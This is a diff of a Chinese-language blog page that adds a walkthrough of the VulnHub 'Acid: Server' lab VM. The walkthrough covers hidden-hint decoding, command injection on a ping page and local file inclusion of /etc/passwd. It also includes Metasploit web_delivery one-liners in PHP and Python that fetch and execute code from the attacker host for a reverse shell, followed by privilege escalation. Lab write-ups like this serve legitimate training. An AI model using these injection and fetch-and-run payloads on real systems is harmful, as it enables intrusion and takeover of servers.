@@ -107,7 +107,36 @@
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/01.01.netdiscover.png">
 <meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/02.01.nmap.png">
-<meta property="og:updated_time" content="2019-05-14T05:53:25.508Z">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/02.02.visit.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/03.01.DirBuster.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/03.02.wow.jpg">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/03.03.MD5decode.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/03.05.DirBuster.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/03.06.Command.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/03.07.Ping_Result.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/03.08.Command_Inject.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/03.09.AnotherWay.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/03.10.acid_text.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/03.11.protected_page.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/03.12.form_js.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/03.13.google_result.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/03.14.GitHub_commits.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/03.15.Set_Up.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/03.16.Login.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/03.17.users.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/03.18.secrect.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/04.01.reverse_kunfu.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/04.02.shell.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/04.03.investigate.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/04.04.home.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/04.05.acid_file.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/04.06.download.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/04.07.WireShark.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/04.08.saman.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/04.09.Xshell.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/04.10.Kali.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/04.11.Falg.png">
+<meta property="og:updated_time" content="2019-05-14T12:53:29.975Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="&#39;VulnHub Acid Server Walkthrough&#39;">
 <meta name="twitter:description" content="1. 查看IP地址由于不知道靶场的登录密码，所以需要使用其他工具获取IP 这里使用Kali自带的一个工具netdiscover">
@@ -395,7 +424,96 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -T4 -sV -O -p- 192.168.126.161</span><br></pre></td></tr></table></figure>
 <p>扫描结果</p>
 <p><img src="/2019/05/13/VulnHub-Acid-Server/02.01.nmap.png" alt></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title=". 参考"></a>. 参考</h1><p>[1] <a href="https://www.vulnhub.com/entry/acid-server,125/" target="_blank" rel="noopener">Acid: Server</a></p>
+<p>扫描发现靶机开放端口为<code>33447</code></p>
+<p>访问<code>http://192.168.126.161:33447</code></p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/02.02.visit.png" alt></p>
+<h1 id="3-Web"><a href="#3-Web" class="headerlink" title="3. Web"></a>3. Web</h1><p>网页的标题是<code>/Challenge</code>看起来是目录<br>先把地址丢到DirBuster里去跑</p>
+<p>查看网页源代码，在末尾发现十六进制字符串<code>&lt;!--0x643239334c6d70775a773d3d--&gt;</code>，解码后发现是base64编码格式<code>d293LmpwZw==</code>，再经过base64解码发现是一个图片<code>wow.jpg</code>，尝试在主页访问图片，并没有这个图片</p>
+<p>这时，查看DirBuster</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/03.01.DirBuster.png" alt></p>
+<p>发现标题确实是目录名<br>访问<code>/Challenge</code>，需要用邮箱和密码登录<br>继续访问扫描出来的目录，发现<code>cake.php</code>页面的标题也是目录名<code>/Magic_Box</code><br>将目录改为<code>/Challenge/Magic_Box</code>，继续进行目录扫描</p>
+<p>在扫描结果里看到了/images目录，将wow.jpg放在里面打开</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/03.02.wow.jpg" alt></p>
+<p>使用WinHex打开图片，在末尾发现<code>;37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34</code><br>使用BurpSuite自带的Ascii Hex进行解码得到<code>7aee0f6d588ed9905ee37f16a7c610d4</code>，看起来像MD5加密后的字符串<br>将字符串丢到MD5解密</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/03.03.MD5decode.png" alt><br>获得<code>63425</code>可能是密码，不过图片这条线就到这里结束了</p>
+<p>再回去看DirBuster扫描结果</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/03.05.DirBuster.png" alt></p>
+<p>访问<code>/Challenge/Magic_Box/command.php</code></p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/03.06.Command.png" alt></p>
+<p>是一个可以执行<code>ping</code>命令的页面，输入Kali的IP地址测试一下</p>
+<p>发现页面没有发生变化，查看页面源代码后发现结果在上方空白处</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/03.07.Ping_Result.png" alt></p>
+<p>尝试命令执行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.126.126;ls</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/03.08.Command_Inject.png" alt></p>
+<p>存在命令执行注入，可以反弹Shell进一步渗透</p>
+<h2 id="3-1-另一种思路"><a href="#3-1-另一种思路" class="headerlink" title="3.1 另一种思路"></a>3.1 另一种思路</h2><p>对于<code>cake.php</code>页面还有另一种获取方法，From:<a href="https://jasperandgarrison.wordpress.com/2017/04/19/walkthrough-acid-server/" target="_blank" rel="noopener">CTF WALKTHROUGH – ACID: SERVER (VULNHUB)</a></p>
+<p>在<code>/Challenge/index.php</code>页面的源代码中，可以发现<code>&lt;!DOCTYPE gkg.qvpn html&gt;</code></p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/03.09.AnotherWay.png" alt></p>
+<p>使用ROT13解密得到<code>txt.dica</code>，反过来是<code>acid.txt</code>，访问<code>/Challenge/acid.txt</code></p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/03.10.acid_text.png" alt></p>
+<p>又获得一个页面<code>protected_page.php</code>，打开之后发现没有权限访问</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/03.11.protected_page.png" alt></p>
+<p>再回到<code>/Challenge/index.php</code>页面的源代码中，可以找到<code>js/forms.js</code>打开发现在文件中有版权信息</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/03.12.form_js.png" alt></p>
+<p>使用Google搜索<code>peredur.net form_js</code></p>
+<p>第一条就是该项目在GitHub上的仓库</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/03.13.google_result.png" alt></p>
+<p>进去之后，发现这是一个已经很久没有更新的项目，并且在Readme里写了作者没有时间更新，希望有人接手的信息，这些信息对我们没有什么用。在<code>commits</code>里查看Readme的更新</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/03.14.GitHub_commits.png" alt></p>
+<p>在<code>Modified the README.md file</code>中可以看到初始用户名和密码</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/03.15.Set_Up.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Username	: test_user </span><br><span class="line">Email		: test@example.com </span><br><span class="line">Password	: 6ZaxN2Vzm9NUJT2y</span><br></pre></td></tr></table></figure>
+<p>使用这组密码登录<code>Challenge/index.php</code>，成功登录</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/03.16.Login.png" alt></p>
+<p>就是之前发现的<code>protected_page.php</code><br>页面提示点击这里继续深入</p>
+<p>点击之后，发现跳转到了<code>/Challenge/include.php</code>页面，页面自带本地包含功能，输入<code>/etc/passwd</code>，页面没有变化，查看源代码可以发现包含成功</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/03.17.users.png" alt></p>
+<p>可以看到<code>acid</code>和<code>saman</code>的用户ID</p>
+<p>在源代码的最下面依然存在这一行被注释掉的十六进制字符串<code>&lt;!--0x5933566a4c6e4a34626e413d--&gt;</code></p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/03.18.secrect.png" alt></p>
+<p>按照之前的解密方式，解密获得<code>cuc.rxnp</code>，再经过ROT13解密获得<code>php.ekac</code>，反过来是<code>cake.php</code>，后续操作和第一种方法一样</p>
+<h1 id="4-渗透"><a href="#4-渗透" class="headerlink" title="4. 渗透"></a>4. 渗透</h1><p><code>Challenge/Magic_Box/command.php</code>页面的标题是<code>Reverse Kunfu</code>，提示反弹Shell</p>
+<p>使用MSF反弹Shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; set lhost 192.168.126.126</span><br><span class="line">lhost =&gt; 192.168.126.126</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; set lport 8126</span><br><span class="line">lport =&gt; 8126</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; set srvport 7777</span><br><span class="line">srvport =&gt; 7777</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; set payload python/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; python/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; run</span><br></pre></td></tr></table></figure>
+<p>PHP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d allow_url_fopen=true -r &quot;eval(file_get_contents(&apos;http://192.168.126.126:2626/qNRqp3NMPx&apos;));&quot;</span><br></pre></td></tr></table></figure>
+<p>python</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import sys;u=__import__(&apos;urllib&apos;+&#123;2:&apos;&apos;,3:&apos;.request&apos;&#125;[sys.version_info[0]],fromlist=(&apos;urlopen&apos;,));r=u.urlopen(&apos;http://192.168.126.126:7777/aSEchhTZ&apos;);exec(r.read());&quot;</span><br></pre></td></tr></table></figure>
+<p>在<code>Challenge/Magic_Box/command.php</code>页面输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;python -c &quot;import sys;u=__import__(&apos;urllib&apos;+&#123;2:&apos;&apos;,3:&apos;.request&apos;&#125;[sys.version_info[0]],fromlist=(&apos;urlopen&apos;,));r=u.urlopen(&apos;http://192.168.126.126:7777/aSEchhTZ&apos;);exec(r.read());&quot;</span><br></pre></td></tr></table></figure>
+<p>Kali中MSF获得Shell</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/04.01.reverse_kunfu.png" alt></p>
+<p>查看id</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/04.02.shell.png" alt></p>
+<p>接下来查找敏感信息，看能否提升权限</p>
+<p>在根目录下发现一个<code>s.bin</code>目录，里面有一个<code>investigate.php</code>的文件，查看其内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Now you have to behave like an investigator to catch the culprit\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/04.03.investigate.png" alt></p>
+<p>查看root,acid,saman的家目录</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/04.04.home.png" alt></p>
+<p>在acid的家目录加看到一个名为<code>.sudo_as_admin_successful</code>大小为0的文件，提示普通用户可以切换为root用户</p>
+<p>查找acid这个用户的文件来获取他的密码来切换账户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user acid 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/04.05.acid_file.png" alt></p>
+<p>第一个是<code>hint.pcapng</code>文件，是一个流量包<br>使用python搭建Server下载下来进行流量分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 12600</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/04.06.download.png" alt></p>
+<p>使用WireShark打开，是一个由6400条记录的流量包</p>
+<p>分析TCP协议，可以发现一段明文传输的对话</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/04.07.WireShark.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">heya</span><br><span class="line">     hello</span><br><span class="line">What was the name of the Culprit???</span><br><span class="line">     saman and nowadays he&apos;s known by the alias of 1337hax0r</span><br><span class="line">oh Fuck Great Now, we gonna Catch Him Soon :D</span><br><span class="line">     Yes We have to !! The mad bomber is on a rage</span><br><span class="line">Ohkcya</span><br><span class="line">     Over and Out</span><br></pre></td></tr></table></figure>
+<p>找到了<code>saman</code>用户，以及他的别名<code>1337hax0r</code>，猜测这可能是他的密码</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/04.08.saman.png" alt></p>
+<p>尝试切换root<code>sudo su</code></p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/04.09.Xshell.png" alt></p>
+<p>查找资料发现是ssh连接的原因，使用Kali切换</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/04.10.Kali.png" alt></p>
+<p>查看Flag</p>
+<p><img src="/2019/05/13/VulnHub-Acid-Server/04.11.Falg.png" alt></p>
+<h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h1><p>1.netdiscover使用<br>2.多看页面源码，注意源码长度<br>3.查找用户文件<code>find / -user 2&gt;/dev/null</code><br>4.MSF反弹Shell模块<code>exploit/multi/script/web_delivery</code></p>
+<h1 id="6-参考"><a href="#6-参考" class="headerlink" title="6. 参考"></a>6. 参考</h1><p>[1] <a href="https://www.vulnhub.com/entry/acid-server,125/" target="_blank" rel="noopener">Acid: Server</a></p>
+<p>[2] <a href="https://jasperandgarrison.wordpress.com/2017/04/19/walkthrough-acid-server/" target="_blank" rel="noopener">CTF WALKTHROUGH – ACID: SERVER (VULNHUB)</a></p>
 <p>[2] <a href="https://www.jianshu.com/p/674a5e88d323" target="_blank" rel="noopener">2018-09-14-Vulnhub渗透测试实战writeup(1)</a></p>
 <p>[3] <a href="https://www.cnblogs.com/zhuxr/p/9996426.html" target="_blank" rel="noopener">Vulnhub Acid</a></p>
 
@@ -437,6 +555,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/05/14/VulnHub-Quaoar/" rel="prev" title="'VulnHub-Quaoar'">
+                'VulnHub-Quaoar' <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -505,7 +627,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">26</span>
+                    <span class="site-state-item-count">27</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -579,7 +701,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-查看IP地址"><span class="nav-text">1. 查看IP地址</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-扫描靶机端口"><span class="nav-text">2. 扫描靶机端口</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-text">. 参考</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-查看IP地址"><span class="nav-text">1. 查看IP地址</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-扫描靶机端口"><span class="nav-text">2. 扫描靶机端口</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-Web"><span class="nav-text">3. Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-另一种思路"><span class="nav-text">3.1 另一种思路</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-渗透"><span class="nav-text">4. 渗透</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-总结"><span class="nav-text">5. 总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-参考"><span class="nav-text">6. 参考</span></a></li></ol></div>
             
 
           </div>
